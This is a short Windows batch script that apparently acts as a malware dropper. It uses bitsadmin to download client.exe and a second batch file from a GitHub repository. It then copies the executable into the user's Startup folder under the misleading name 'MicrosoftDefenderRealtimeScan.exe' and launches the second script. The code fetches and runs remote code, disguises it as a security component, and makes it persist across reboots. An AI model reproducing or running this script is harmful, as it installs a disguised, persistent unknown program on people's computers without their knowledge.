@echo off
set "autostart_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftDefenderRealtimeScan.exe"
bitsadmin.exe /transfer "clientdownload" https://github.com/simon0302010/temp/raw/main/client.exe client.exe
bitsadmin.exe /transfer "prepare2download" https://github.com/simon0302010/temp/raw/main/prepare2.bat prepare2.bat
copy "client.exe" "%autostart_folder%"
start prepare2.bat
